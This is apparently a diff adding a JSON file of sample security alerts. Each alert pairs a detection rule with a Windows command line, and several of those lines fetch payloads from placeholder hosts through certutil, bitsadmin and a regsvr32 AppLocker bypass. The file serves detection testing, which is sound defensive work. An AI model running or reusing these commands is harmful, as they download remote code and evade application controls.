@@ -1,0 +1,52 @@
+[
+    {
+      "timestamp": "2025-03-04 10:15:22",
+      "rule_name": "CertUtil Download",
+      "description": "CertUtil used to download files from internet",
+      "severity": 4,
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\file.exe",
+      "pid": 1234,
+      "username": "admin"
+    },
+    {
+      "timestamp": "2025-03-04 11:30:45",
+      "rule_name": "PowerShell Encoded Command",
+      "description": "PowerShell executing encoded commands",
+      "severity": 4,
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==",
+      "pid": 2345,
+      "username": "user1"
+    },
+    {
+      "timestamp": "2025-03-04 12:45:10",
+      "rule_name": "Regsvr32 AppLocker Bypass",
+      "description": "Regsvr32 used to bypass AppLocker",
+      "severity": 5,
+      "process_name": "regsvr32.exe",
+      "command_line": "regsvr32.exe /s /u /i:http://evil.com/script.sct scrobj.dll",
+      "pid": 3456,
+      "username": "admin"
+    },
+    {
+      "timestamp": "2025-03-03 14:20:30",
+      "rule_name": "WMIC Process Creation",
+      "description": "WMIC used to create process",
+      "severity": 3,
+      "process_name": "wmic.exe",
+      "command_line": "wmic.exe process call create calc.exe",
+      "pid": 4567,
+      "username": "user2"
+    },
+    {
+      "timestamp": "2025-03-03 15:55:17",
+      "rule_name": "BITSAdmin File Transfer",
+      "description": "BITSAdmin used for file transfer",
+      "severity": 3,
+      "process_name": "bitsadmin.exe",
+      "command_line": "bitsadmin.exe /transfer myJob http://suspicious.com/file.exe C:\\Windows\\temp\\file.exe",
+      "pid": 5678,
+      "username": "admin"
+    }
+  ]
